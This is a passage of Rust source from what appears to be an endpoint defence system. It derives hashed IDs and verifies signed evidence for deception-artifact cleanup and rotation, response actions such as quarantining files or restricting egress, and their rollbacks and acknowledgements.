            deregistered_artifact_count_evidence_hash: deregistered_artifact_count_evidence_hash
                .as_str(),
            remaining_registered_artifact_count_evidence_hash:
                remaining_registered_artifact_count_evidence_hash.as_str(),
        },
    )
}

fn deception_cleanup_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
    endpoint_id: &str,
    policy_hash: &str,
) -> Result<String> {
    let plan_root_evidence_hash = evidence_value_hash(
        evidence,
        "deceptionPlanRoot",
        "deception cleanup plan root evidence",
    )?;
    let plan_hash_evidence_hash = evidence_value_hash(
        evidence,
        "deceptionPlanHash",
        "deception cleanup plan hash evidence",
    )?;
    let report_hash_evidence_hash = evidence_value_hash(
        evidence,
        "cleanupReportHash",
        "deception cleanup report hash evidence",
    )?;
    let artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "artifactCount",
        "deception cleanup artifact count evidence",
    )?;
    let dry_run_evidence_hash =
        evidence_value_hash(evidence, "dryRun", "deception cleanup dry-run evidence")?;
    let removed_count_evidence_hash = evidence_value_hash(
        evidence,
        "removedCount",
        "deception cleanup removed count evidence",
    )?;
    let would_remove_count_evidence_hash = evidence_value_hash(
        evidence,
        "wouldRemoveCount",
        "deception cleanup would-remove count evidence",
    )?;
    let missing_count_evidence_hash = evidence_value_hash(
        evidence,
        "missingCount",
        "deception cleanup missing count evidence",
    )?;
    let refused_count_evidence_hash = evidence_value_hash(
        evidence,
        "refusedCount",
        "deception cleanup refused count evidence",
    )?;
    let deregistered_artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "deregisteredArtifactCount",
        "deception cleanup deregistered artifact count evidence",
    )?;
    let remaining_registered_artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "remainingRegisteredArtifactCount",
        "deception cleanup remaining registered artifact count evidence",
    )?;
    Ok(deception_cleanup_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        DeceptionCleanupIdEvidenceHashes {
            plan_root_evidence_hash,
            plan_hash_evidence_hash,
            report_hash_evidence_hash,
            artifact_count_evidence_hash,
            dry_run_evidence_hash,
            removed_count_evidence_hash,
            would_remove_count_evidence_hash,
            missing_count_evidence_hash,
            refused_count_evidence_hash,
            deregistered_artifact_count_evidence_hash,
            remaining_registered_artifact_count_evidence_hash,
        },
    ))
}

fn deception_cleanup_id_from_evidence_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    evidence_hashes: DeceptionCleanupIdEvidenceHashes<'_>,
) -> String {
    stable_id(
        "deception_cleanup",
        [
            endpoint_id,
            policy_hash,
            evidence_hashes.plan_root_evidence_hash,
            evidence_hashes.plan_hash_evidence_hash,
            evidence_hashes.report_hash_evidence_hash,
            evidence_hashes.artifact_count_evidence_hash,
            evidence_hashes.dry_run_evidence_hash,
            evidence_hashes.removed_count_evidence_hash,
            evidence_hashes.would_remove_count_evidence_hash,
            evidence_hashes.missing_count_evidence_hash,
            evidence_hashes.refused_count_evidence_hash,
            evidence_hashes.deregistered_artifact_count_evidence_hash,
            evidence_hashes.remaining_registered_artifact_count_evidence_hash,
        ],
    )
}

struct DeceptionRotationIdValues<'a> {
    old_plan_root: &'a str,
    new_plan_root: &'a str,
    old_plan_hash: &'a str,
    new_plan_hash: &'a str,
    report_hash: &'a str,
    dry_run: &'a str,
    cleanup_removed_count: &'a str,
    cleanup_would_remove_count: &'a str,
    cleanup_missing_count: &'a str,
    cleanup_refused_count: &'a str,
    materialization_created_count: &'a str,
    materialization_skipped_count: &'a str,
    deregistered_artifact_count: &'a str,
    registered_artifact_count: &'a str,
    remaining_registered_artifact_count: &'a str,
}

struct DeceptionRotationIdEvidenceHashes<'a> {
    old_plan_root_evidence_hash: &'a str,
    new_plan_root_evidence_hash: &'a str,
    old_plan_hash_evidence_hash: &'a str,
    new_plan_hash_evidence_hash: &'a str,
    report_hash_evidence_hash: &'a str,
    dry_run_evidence_hash: &'a str,
    cleanup_removed_count_evidence_hash: &'a str,
    cleanup_would_remove_count_evidence_hash: &'a str,
    cleanup_missing_count_evidence_hash: &'a str,
    cleanup_refused_count_evidence_hash: &'a str,
    materialization_created_count_evidence_hash: &'a str,
    materialization_skipped_count_evidence_hash: &'a str,
    deregistered_artifact_count_evidence_hash: &'a str,
    registered_artifact_count_evidence_hash: &'a str,
    remaining_registered_artifact_count_evidence_hash: &'a str,
}

fn deception_rotation_id_from_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    values: DeceptionRotationIdValues<'_>,
) -> String {
    let old_plan_root_evidence_hash = sha256(values.old_plan_root.as_bytes()).to_hex_prefixed();
    let new_plan_root_evidence_hash = sha256(values.new_plan_root.as_bytes()).to_hex_prefixed();
    let old_plan_hash_evidence_hash = sha256(values.old_plan_hash.as_bytes()).to_hex_prefixed();
    let new_plan_hash_evidence_hash = sha256(values.new_plan_hash.as_bytes()).to_hex_prefixed();
    let report_hash_evidence_hash = sha256(values.report_hash.as_bytes()).to_hex_prefixed();
    let dry_run_evidence_hash = sha256(values.dry_run.as_bytes()).to_hex_prefixed();
    let cleanup_removed_count_evidence_hash =
        sha256(values.cleanup_removed_count.as_bytes()).to_hex_prefixed();
    let cleanup_would_remove_count_evidence_hash =
        sha256(values.cleanup_would_remove_count.as_bytes()).to_hex_prefixed();
    let cleanup_missing_count_evidence_hash =
        sha256(values.cleanup_missing_count.as_bytes()).to_hex_prefixed();
    let cleanup_refused_count_evidence_hash =
        sha256(values.cleanup_refused_count.as_bytes()).to_hex_prefixed();
    let materialization_created_count_evidence_hash =
        sha256(values.materialization_created_count.as_bytes()).to_hex_prefixed();
    let materialization_skipped_count_evidence_hash =
        sha256(values.materialization_skipped_count.as_bytes()).to_hex_prefixed();
    let deregistered_artifact_count_evidence_hash =
        sha256(values.deregistered_artifact_count.as_bytes()).to_hex_prefixed();
    let registered_artifact_count_evidence_hash =
        sha256(values.registered_artifact_count.as_bytes()).to_hex_prefixed();
    let remaining_registered_artifact_count_evidence_hash =
        sha256(values.remaining_registered_artifact_count.as_bytes()).to_hex_prefixed();
    deception_rotation_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        DeceptionRotationIdEvidenceHashes {
            old_plan_root_evidence_hash: old_plan_root_evidence_hash.as_str(),
            new_plan_root_evidence_hash: new_plan_root_evidence_hash.as_str(),
            old_plan_hash_evidence_hash: old_plan_hash_evidence_hash.as_str(),
            new_plan_hash_evidence_hash: new_plan_hash_evidence_hash.as_str(),
            report_hash_evidence_hash: report_hash_evidence_hash.as_str(),
            dry_run_evidence_hash: dry_run_evidence_hash.as_str(),
            cleanup_removed_count_evidence_hash: cleanup_removed_count_evidence_hash.as_str(),
            cleanup_would_remove_count_evidence_hash: cleanup_would_remove_count_evidence_hash
                .as_str(),
            cleanup_missing_count_evidence_hash: cleanup_missing_count_evidence_hash.as_str(),
            cleanup_refused_count_evidence_hash: cleanup_refused_count_evidence_hash.as_str(),
            materialization_created_count_evidence_hash:
                materialization_created_count_evidence_hash.as_str(),
            materialization_skipped_count_evidence_hash:
                materialization_skipped_count_evidence_hash.as_str(),
            deregistered_artifact_count_evidence_hash: deregistered_artifact_count_evidence_hash
                .as_str(),
            registered_artifact_count_evidence_hash: registered_artifact_count_evidence_hash
                .as_str(),
            remaining_registered_artifact_count_evidence_hash:
                remaining_registered_artifact_count_evidence_hash.as_str(),
        },
    )
}

fn deception_rotation_id_from_evidence(
    evidence: &[EndpointReceiptEvidence],
    endpoint_id: &str,
    policy_hash: &str,
) -> Result<String> {
    let old_plan_root_evidence_hash = evidence_value_hash(
        evidence,
        "oldDeceptionPlanRoot",
        "deception rotation old plan root evidence",
    )?;
    let new_plan_root_evidence_hash = evidence_value_hash(
        evidence,
        "newDeceptionPlanRoot",
        "deception rotation new plan root evidence",
    )?;
    let old_plan_hash_evidence_hash = evidence_value_hash(
        evidence,
        "oldDeceptionPlanHash",
        "deception rotation old plan hash evidence",
    )?;
    let new_plan_hash_evidence_hash = evidence_value_hash(
        evidence,
        "newDeceptionPlanHash",
        "deception rotation new plan hash evidence",
    )?;
    let report_hash_evidence_hash = evidence_value_hash(
        evidence,
        "rotationReportHash",
        "deception rotation report hash evidence",
    )?;
    let dry_run_evidence_hash =
        evidence_value_hash(evidence, "dryRun", "deception rotation dry-run evidence")?;
    let cleanup_removed_count_evidence_hash = evidence_value_hash(
        evidence,
        "cleanupRemovedCount",
        "deception rotation cleanup removed count evidence",
    )?;
    let cleanup_would_remove_count_evidence_hash = evidence_value_hash(
        evidence,
        "cleanupWouldRemoveCount",
        "deception rotation cleanup would-remove count evidence",
    )?;
    let cleanup_missing_count_evidence_hash = evidence_value_hash(
        evidence,
        "cleanupMissingCount",
        "deception rotation cleanup missing count evidence",
    )?;
    let cleanup_refused_count_evidence_hash = evidence_value_hash(
        evidence,
        "cleanupRefusedCount",
        "deception rotation cleanup refused count evidence",
    )?;
    let materialization_created_count_evidence_hash = evidence_value_hash(
        evidence,
        "materializationCreatedCount",
        "deception rotation materialization created count evidence",
    )?;
    let materialization_skipped_count_evidence_hash = evidence_value_hash(
        evidence,
        "materializationSkippedCount",
        "deception rotation materialization skipped count evidence",
    )?;
    let deregistered_artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "deregisteredArtifactCount",
        "deception rotation deregistered artifact count evidence",
    )?;
    let registered_artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "registeredArtifactCount",
        "deception rotation registered artifact count evidence",
    )?;
    let remaining_registered_artifact_count_evidence_hash = evidence_value_hash(
        evidence,
        "remainingRegisteredArtifactCount",
        "deception rotation remaining registered artifact count evidence",
    )?;
    Ok(deception_rotation_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        DeceptionRotationIdEvidenceHashes {
            old_plan_root_evidence_hash,
            new_plan_root_evidence_hash,
            old_plan_hash_evidence_hash,
            new_plan_hash_evidence_hash,
            report_hash_evidence_hash,
            dry_run_evidence_hash,
            cleanup_removed_count_evidence_hash,
            cleanup_would_remove_count_evidence_hash,
            cleanup_missing_count_evidence_hash,
            cleanup_refused_count_evidence_hash,
            materialization_created_count_evidence_hash,
            materialization_skipped_count_evidence_hash,
            deregistered_artifact_count_evidence_hash,
            registered_artifact_count_evidence_hash,
            remaining_registered_artifact_count_evidence_hash,
        },
    ))
}

fn deception_rotation_id_from_evidence_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    evidence_hashes: DeceptionRotationIdEvidenceHashes<'_>,
) -> String {
    stable_id(
        "deception_rotation",
        [
            endpoint_id,
            policy_hash,
            evidence_hashes.old_plan_root_evidence_hash,
            evidence_hashes.new_plan_root_evidence_hash,
            evidence_hashes.old_plan_hash_evidence_hash,
            evidence_hashes.new_plan_hash_evidence_hash,
            evidence_hashes.report_hash_evidence_hash,
            evidence_hashes.dry_run_evidence_hash,
            evidence_hashes.cleanup_removed_count_evidence_hash,
            evidence_hashes.cleanup_would_remove_count_evidence_hash,
            evidence_hashes.cleanup_missing_count_evidence_hash,
            evidence_hashes.cleanup_refused_count_evidence_hash,
            evidence_hashes.materialization_created_count_evidence_hash,
            evidence_hashes.materialization_skipped_count_evidence_hash,
            evidence_hashes.deregistered_artifact_count_evidence_hash,
            evidence_hashes.registered_artifact_count_evidence_hash,
            evidence_hashes.remaining_registered_artifact_count_evidence_hash,
        ],
    )
}

fn response_execution_effect_binding_digest_from_effects(
    effects: &[EndpointResponseExecutionEffect],
) -> Result<Option<String>> {
    let entries = effects
        .iter()
        .map(|effect| ResponseExecutionEffectBindingEntry {
            key: format!("executionEffect:{}", effect.effect_id),
            value_hash: sha256(response_effect_evidence_value(effect).as_bytes()).to_hex_prefixed(),
        })
        .collect();
    response_execution_effect_binding_digest(entries)
}

fn response_execution_effect_binding_digest_from_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<Option<String>> {
    let entries = evidence
        .iter()
        .filter(|item| item.key.starts_with("executionEffect:"))
        .map(|item| ResponseExecutionEffectBindingEntry {
            key: item.key.clone(),
            value_hash: item.value_hash.clone(),
        })
        .collect();
    response_execution_effect_binding_digest(entries)
}

fn response_execution_effect_binding_digest(
    mut entries: Vec<ResponseExecutionEffectBindingEntry>,
) -> Result<Option<String>> {
    if entries.is_empty() {
        return Ok(None);
    }
    entries.sort_by(|left, right| left.key.cmp(&right.key));
    let value =
        serde_json::to_value(entries).context("serialize response execution effect binding")?;
    let canonical =
        canonicalize_json(&value).context("canonicalize response execution effect binding")?;
    Ok(Some(sha256(canonical.as_bytes()).to_hex_prefixed()))
}

fn response_rollback_id_from_effects(
    execution_id: &str,
    response_action_id: &str,
    rollback_ref: &str,
    effects: &[EndpointResponseExecutionEffect],
) -> Result<String> {
    let execution_id_hash = sha256(execution_id.as_bytes()).to_hex_prefixed();
    let effect_binding_digest = response_rollback_effect_binding_digest_from_effects(effects)?
        .ok_or_else(|| anyhow!("response rollback effect binding requires at least one effect"))?;
    Ok(response_rollback_id_from_effect_digest(
        response_action_id,
        rollback_ref,
        execution_id_hash.as_str(),
        effect_binding_digest.as_str(),
    ))
}

fn response_rollback_id_from_signed_evidence(
    evidence: &[EndpointReceiptEvidence],
    response_action_id: &str,
    rollback_ref: &str,
) -> Result<String> {
    let Some(execution_id) = evidence.iter().find(|item| item.key == "executionId") else {
        return Err(anyhow!("rollback execution id evidence is required"));
    };
    require_evidence_hash_not_empty(execution_id, "rollback execution id evidence")?;
    let effect_binding_digest = response_rollback_effect_binding_digest_from_evidence(evidence)?
        .ok_or_else(|| anyhow!("rollback effect evidence is required"))?;
    Ok(response_rollback_id_from_effect_digest(
        response_action_id,
        rollback_ref,
        execution_id.value_hash.as_str(),
        effect_binding_digest.as_str(),
    ))
}

fn response_rollback_id_from_effect_digest(
    response_action_id: &str,
    rollback_ref: &str,
    execution_id_hash: &str,
    effect_binding_digest: &str,
) -> String {
    stable_id(
        "response_rollback",
        [
            response_action_id,
            rollback_ref,
            execution_id_hash,
            effect_binding_digest,
        ],
    )
}

fn response_rollback_effect_binding_digest_from_effects(
    effects: &[EndpointResponseExecutionEffect],
) -> Result<Option<String>> {
    let entries = effects
        .iter()
        .map(|effect| ResponseExecutionEffectBindingEntry {
            key: format!("rollbackEffect:{}", effect.effect_id),
            value_hash: sha256(response_effect_evidence_value(effect).as_bytes()).to_hex_prefixed(),
        })
        .collect();
    response_execution_effect_binding_digest(entries)
}

fn response_rollback_effect_binding_digest_from_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<Option<String>> {
    let entries = evidence
        .iter()
        .filter(|item| item.key.starts_with("rollbackEffect:"))
        .map(|item| ResponseExecutionEffectBindingEntry {
            key: item.key.clone(),
            value_hash: item.value_hash.clone(),
        })
        .collect();
    response_execution_effect_binding_digest(entries)
}

fn response_effect_evidence_value(effect: &EndpointResponseExecutionEffect) -> String {
    serde_json::to_value(effect)
        .ok()
        .and_then(|value| canonicalize_json(&value).ok())
        .unwrap_or_else(|| effect.effect_id.clone())
}

fn response_acknowledgement_id_from_report_fields(
    execution_id: &str,
    response_action_id: &str,
    rollback_ref: &str,
    acknowledged_by: &str,
    note: Option<&str>,
    effects: &[EndpointResponseExecutionEffect],
) -> String {
    response_acknowledgement_id_from_report_fields_with_control(
        execution_id,
        response_action_id,
        rollback_ref,
        acknowledged_by,
        note,
        effects,
        None,
    )
}

fn response_acknowledgement_id_from_report_fields_with_control(
    execution_id: &str,
    response_action_id: &str,
    rollback_ref: &str,
    acknowledged_by: &str,
    note: Option<&str>,
    effects: &[EndpointResponseExecutionEffect],
    control_correlation: Option<&EndpointResponseControlCorrelation>,
) -> String {
    let execution_id_hash = sha256(execution_id.as_bytes()).to_hex_prefixed();
    let note_hash = note
        .map(|note| sha256(note.as_bytes()).to_hex_prefixed())
        .unwrap_or_else(response_acknowledgement_absent_note_marker);
    let effect_binding_digest =
        response_acknowledgement_effect_binding_digest_from_effects(effects)
            .ok()
            .flatten()
            .unwrap_or_else(response_acknowledgement_absent_effect_marker);
    let control_binding_digest = control_correlation.and_then(|control| {
        response_control_acknowledgement_binding_digest_from_control(control).ok()
    });
    response_acknowledgement_id_from_evidence_hashes(
        response_action_id,
        rollback_ref,
        execution_id_hash.as_str(),
        acknowledged_by,
        note_hash.as_str(),
        effect_binding_digest.as_str(),
        control_binding_digest.as_deref(),
    )
}

fn response_acknowledgement_id_from_signed_evidence(
    evidence: &[EndpointReceiptEvidence],
    response_action_id: &str,
    rollback_ref: &str,
    acknowledged_by: &str,
) -> Result<String> {
    let Some(execution_id) = evidence.iter().find(|item| item.key == "executionId") else {
        return Err(anyhow!("acknowledgement execution id evidence is required"));
    };
    require_evidence_hash_not_empty(execution_id, "acknowledgement execution id evidence")?;
    let note_hash = if let Some(note) = evidence.iter().find(|item| item.key == "note") {
        require_evidence_hash_not_empty(note, "acknowledgement note evidence")?;
        note.value_hash.clone()
    } else {
        response_acknowledgement_absent_note_marker()
    };
    let effect_binding_digest =
        response_acknowledgement_effect_binding_digest_from_evidence(evidence)?
            .unwrap_or_else(response_acknowledgement_absent_effect_marker);
    let control_binding_digest =
        response_control_acknowledgement_binding_digest_from_evidence(evidence)?;
    Ok(response_acknowledgement_id_from_evidence_hashes(
        response_action_id,
        rollback_ref,
        execution_id.value_hash.as_str(),
        acknowledged_by,
        note_hash.as_str(),
        effect_binding_digest.as_str(),
        control_binding_digest.as_deref(),
    ))
}

fn response_acknowledgement_id_from_evidence_hashes(
    response_action_id: &str,
    rollback_ref: &str,
    execution_id_hash: &str,
    acknowledged_by: &str,
    note_hash: &str,
    effect_binding_digest: &str,
    control_binding_digest: Option<&str>,
) -> String {
    let mut parts = vec![
        response_action_id,
        rollback_ref,
        execution_id_hash,
        acknowledged_by,
        note_hash,
        effect_binding_digest,
    ];
    if let Some(control_binding_digest) = control_binding_digest {
        parts.push(control_binding_digest);
    }
    stable_id("response_acknowledgement", parts)
}

fn response_acknowledgement_absent_note_marker() -> String {
    "note:absent".to_string()
}

fn response_acknowledgement_absent_effect_marker() -> String {
    "effect:absent".to_string()
}

fn response_acknowledgement_effect_binding_digest_from_effects(
    effects: &[EndpointResponseExecutionEffect],
) -> Result<Option<String>> {
    let entries = effects
        .iter()
        .map(|effect| ResponseExecutionEffectBindingEntry {
            key: format!("acknowledgementEffect:{}", effect.effect_id),
            value_hash: sha256(response_effect_evidence_value(effect).as_bytes()).to_hex_prefixed(),
        })
        .collect();
    response_execution_effect_binding_digest(entries)
}

fn response_acknowledgement_effect_binding_digest_from_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<Option<String>> {
    let entries = evidence
        .iter()
        .filter(|item| item.key.starts_with("acknowledgementEffect:"))
        .map(|item| ResponseExecutionEffectBindingEntry {
            key: item.key.clone(),
            value_hash: item.value_hash.clone(),
        })
        .collect();
    response_execution_effect_binding_digest(entries)
}

fn response_control_acknowledgement_binding_digest_from_control(
    control: &EndpointResponseControlCorrelation,
) -> Result<String> {
    let mut entries = vec![
        ResponseExecutionEffectBindingEntry {
            key: "controlResponseActionId".to_string(),
            value_hash: sha256(control.response_action_id.as_bytes()).to_hex_prefixed(),
        },
        ResponseExecutionEffectBindingEntry {
            key: "controlTargetKind".to_string(),
            value_hash: sha256(control.target_kind.as_bytes()).to_hex_prefixed(),
        },
        ResponseExecutionEffectBindingEntry {
            key: "controlTargetId".to_string(),
            value_hash: sha256(control.target_id.as_bytes()).to_hex_prefixed(),
        },
        ResponseExecutionEffectBindingEntry {
            key: "controlAckTokenHash".to_string(),
            value_hash: control.ack_token_hash.clone(),
        },
        ResponseExecutionEffectBindingEntry {
            key: "controlAckStatus".to_string(),
            value_hash: sha256(control.ack_status.as_bytes()).to_hex_prefixed(),
        },
    ];
    if let Some(delivery_id) = &control.delivery_id {
        entries.push(ResponseExecutionEffectBindingEntry {
            key: "controlDeliveryId".to_string(),
            value_hash: sha256(delivery_id.as_bytes()).to_hex_prefixed(),
        });
    }
    if let Some(resulting_state) = &control.resulting_state {
        entries.push(ResponseExecutionEffectBindingEntry {
            key: "controlResultingState".to_string(),
            value_hash: sha256(resulting_state.as_bytes()).to_hex_prefixed(),
        });
    }
    response_execution_effect_binding_digest(entries)?
        .ok_or_else(|| anyhow!("control acknowledgement binding evidence is required"))
}

fn response_control_acknowledgement_binding_digest_from_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<Option<String>> {
    if !evidence.iter().any(|item| item.key.starts_with("control")) {
        return Ok(None);
    }

    let mut entries = Vec::new();
    for (key, field_name) in [
        (
            "controlResponseActionId",
            "control acknowledgement response action id evidence",
        ),
        (
            "controlTargetKind",
            "control acknowledgement target kind evidence",
        ),
        (
            "controlTargetId",
            "control acknowledgement target id evidence",
        ),
        (
            "controlAckTokenHash",
            "control acknowledgement token hash evidence",
        ),
        (
            "controlAckStatus",
            "control acknowledgement status evidence",
        ),
    ] {
        let item = evidence
            .iter()
            .find(|item| item.key == key)
            .ok_or_else(|| anyhow!("{field_name} is required"))?;
        require_evidence_hash_not_empty(item, field_name)?;
        entries.push(ResponseExecutionEffectBindingEntry {
            key: key.to_string(),
            value_hash: item.value_hash.clone(),
        });
    }
    for (key, field_name) in [
        (
            "controlDeliveryId",
            "control acknowledgement delivery id evidence",
        ),
        (
            "controlResultingState",
            "control acknowledgement resulting state evidence",
        ),
    ] {
        if let Some(item) = evidence.iter().find(|item| item.key == key) {
            require_evidence_hash_not_empty(item, field_name)?;
            entries.push(ResponseExecutionEffectBindingEntry {
                key: key.to_string(),
                value_hash: item.value_hash.clone(),
            });
        }
    }
    Ok(Some(
        response_execution_effect_binding_digest(entries)?
            .ok_or_else(|| anyhow!("control acknowledgement binding evidence is required"))?,
    ))
}

fn response_execution_bundle_id_from_signed_fields(
    decision: &EndpointDecisionRecord,
    root_node_id: &str,
    graph_slice_id: &str,
    graph_content_hash: &str,
) -> Result<String> {
    let ttl_seconds = decision
        .ttl_seconds
        .ok_or_else(|| anyhow!("response ttl seconds is required"))?;
    let response_action_id = response_action_id_from_signed_response_fields(
        root_node_id,
        graph_slice_id,
        &decision.action,
        ttl_seconds,
    );
    let status = response_execution_status_from_decision(decision)?;
    if status == "failed" {
        return Ok(stable_id(
            "evidence_bundle",
            [
                response_action_id.as_str(),
                graph_slice_id,
                graph_content_hash,
                "failed",
            ],
        ));
    }
    Ok(stable_id(
        "evidence_bundle",
        [
            response_action_id.as_str(),
            graph_slice_id,
            graph_content_hash,
        ],
    ))
}

fn require_response_execution_dry_run_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    require_evidence_value_hash(evidence, "dryRun", "false", "execution dry-run evidence")
}

fn require_response_execution_actor_evidence(evidence: &[EndpointReceiptEvidence]) -> Result<()> {
    let actor_hash = evidence_value_hash(evidence, "actorHash", "response actor evidence")?;
    let execution_actor_hash =
        evidence_value_hash(evidence, "executionActorHash", "execution actor evidence")?;
    if !hex_strings_match(actor_hash, execution_actor_hash) {
        return Err(anyhow!(
            "execution actor evidence hash must match response actor evidence"
        ));
    }
    Ok(())
}

fn require_response_rollback_execution_id_evidence(
    evidence: &[EndpointReceiptEvidence],
    signed_rollback_id: Option<&str>,
    response_action_id: &str,
    rollback_ref: &str,
) -> Result<()> {
    require_nonempty_hashed_evidence(evidence, "executionId", "rollback execution id evidence")?;
    let rollback_id =
        response_rollback_id_from_signed_evidence(evidence, response_action_id, rollback_ref)?;
    if signed_rollback_id != Some(rollback_id.as_str()) {
        return Err(anyhow!(
            "rollback execution id evidence hash must match signed rollback proof"
        ));
    }
    Ok(())
}

fn require_response_acknowledgement_execution_id_evidence(
    evidence: &[EndpointReceiptEvidence],
    signed_acknowledgement_id: Option<&str>,
    response_action_id: &str,
    rollback_ref: &str,
    acknowledged_by: &str,
) -> Result<()> {
    require_nonempty_hashed_evidence(
        evidence,
        "executionId",
        "acknowledgement execution id evidence",
    )?;
    let acknowledgement_id = response_acknowledgement_id_from_signed_evidence(
        evidence,
        response_action_id,
        rollback_ref,
        acknowledged_by,
    )?;
    if signed_acknowledgement_id != Some(acknowledgement_id.as_str()) {
        return Err(anyhow!(
            "acknowledgement execution id evidence hash must match signed acknowledgement proof"
        ));
    }
    Ok(())
}

fn require_response_acknowledgement_note_evidence(
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    if evidence.iter().any(|item| item.key == "note") {
        require_nonempty_hashed_evidence(evidence, "note", "acknowledgement note evidence")?;
    }
    Ok(())
}

fn require_response_effect_count_evidence(
    evidence: &[EndpointReceiptEvidence],
    effect_key_prefix: &str,
    field_name: &str,
) -> Result<()> {
    let effect_count = evidence
        .iter()
        .filter(|item| item.key.starts_with(effect_key_prefix))
        .count();
    require_evidence_value_hash(
        evidence,
        "effectCount",
        effect_count.to_string(),
        field_name,
    )
}

fn require_response_effect_evidence_hashes(
    evidence: &[EndpointReceiptEvidence],
    effect_key_prefix: &str,
    field_name: &str,
) -> Result<()> {
    for effect_evidence in evidence
        .iter()
        .filter(|item| item.key.starts_with(effect_key_prefix))
    {
        require_evidence_hash_not_empty(effect_evidence, field_name)?;
    }
    Ok(())
}

fn require_response_execution_effect_type_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let expected_effect_type = response_execution_effect_type_for_action(&decision.action);
    require_response_typed_effect_evidence(
        evidence,
        "executionEffect:",
        "executionEffectType:",
        expected_effect_type,
        "execution effect type evidence",
    )
}

fn require_response_rollback_effect_type_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let expected_effect_type = response_rollback_effect_type_for_action(&decision.action);
    require_response_typed_effect_evidence(
        evidence,
        "rollbackEffect:",
        "rollbackEffectType:",
        expected_effect_type,
        "rollback effect type evidence",
    )
}

fn require_response_acknowledgement_effect_type_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let expected_effect_type = response_execution_effect_type_for_action(&decision.action);
    require_response_typed_effect_evidence(
        evidence,
        "acknowledgementEffect:",
        "acknowledgementEffectType:",
        expected_effect_type,
        "acknowledgement effect type evidence",
    )
}

fn require_response_typed_effect_evidence(
    evidence: &[EndpointReceiptEvidence],
    effect_key_prefix: &str,
    effect_type_key_prefix: &str,
    expected_effect_type: Option<&str>,
    field_name: &str,
) -> Result<()> {
    let effect_ids = evidence
        .iter()
        .filter_map(|item| item.key.strip_prefix(effect_key_prefix))
        .map(ToOwned::to_owned)
        .collect::<BTreeSet<_>>();
    let effect_type_ids = evidence
        .iter()
        .filter_map(|item| item.key.strip_prefix(effect_type_key_prefix))
        .map(ToOwned::to_owned)
        .collect::<BTreeSet<_>>();

    if effect_ids != effect_type_ids {
        return Err(anyhow!("{field_name} must match response effect evidence"));
    }
    if effect_ids.is_empty() {
        return Ok(());
    }

    let expected_effect_type =
        expected_effect_type.ok_or_else(|| anyhow!("{field_name} is invalid for action"))?;
    for effect_id in effect_ids {
        let effect_type_key = format!("{effect_type_key_prefix}{effect_id}");
        require_evidence_value_hash(
            evidence,
            effect_type_key.as_str(),
            expected_effect_type,
            field_name,
        )?;
    }
    Ok(())
}

fn response_execution_effect_type_for_action(
    action: &EndpointDecisionAction,
) -> Option<&'static str> {
    match action {
        EndpointDecisionAction::RestrictEgress => Some("restrict_egress"),
        EndpointDecisionAction::QuarantineFile => Some("quarantine_file"),
        EndpointDecisionAction::DisablePersistence => Some("disable_persistence"),
        EndpointDecisionAction::RevokeGrant => Some("revoke_grant"),
        EndpointDecisionAction::SuspendProcessTree => Some("suspend_process_tree"),
        EndpointDecisionAction::TerminateProcessTree => Some("terminate_process_tree"),
        EndpointDecisionAction::CollectEvidence => None,
        _ => None,
    }
}

fn response_rollback_effect_type_for_action(
    action: &EndpointDecisionAction,
) -> Option<&'static str> {
    match action {
        EndpointDecisionAction::RestrictEgress => Some("restore_egress"),
        EndpointDecisionAction::QuarantineFile => Some("restore_quarantine_file"),
        EndpointDecisionAction::DisablePersistence => Some("restore_persistence_file"),
        EndpointDecisionAction::SuspendProcessTree => Some("resume_process_tree"),
        _ => None,
    }
}

fn require_response_acknowledgement_effect_evidence(
    decision: &EndpointDecisionRecord,
    evidence: &[EndpointReceiptEvidence],
) -> Result<()> {
    let status = response_acknowledgement_status_from_decision(decision)?;
    let effect_count = evidence
        .iter()
        .filter(|item| item.key.starts_with("acknowledgementEffect:"))
        .count();
    if matches!(decision.action, EndpointDecisionAction::CollectEvidence) && effect_count > 0 {
        return Err(anyhow!(
            "collect evidence acknowledgement effect evidence is invalid"
        ));
    }
    if status == "succeeded"
        && !matches!(decision.action, EndpointDecisionAction::CollectEvidence)
        && effect_count == 0
    {
        return Err(anyhow!("acknowledgement effect evidence is required"));
    }
    Ok(())
}

fn require_evidence_bundle_manifest_evidence(
    evidence: &[EndpointReceiptEvidence],
    signed_bundle_id: Option<&str>,
    graph_slice_id: Option<&str>,
    content_hash: Option<&str>,
    node_count: usize,
    edge_count: usize,
) -> Result<()> {
    let signed_bundle_id =
        signed_bundle_id.ok_or_else(|| anyhow!("evidence bundle id signed id is required"))?;
    let graph_slice_id =
        graph_slice_id.ok_or_else(|| anyhow!("evidence bundle graph slice id is required"))?;
    let content_hash =
        content_hash.ok_or_else(|| anyhow!("evidence bundle content hash is required"))?;
    require_evidence_value_hash(
        evidence,
        "evidenceBundleId",
        signed_bundle_id,
        "evidence bundle id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "graphSliceId",
        graph_slice_id,
        "evidence bundle graph slice evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "contentHash",
        content_hash,
        "evidence bundle content hash evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "nodeCount",
        node_count.to_string(),
        "evidence bundle node count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "edgeCount",
        edge_count.to_string(),
        "evidence bundle edge count evidence",
    )
}

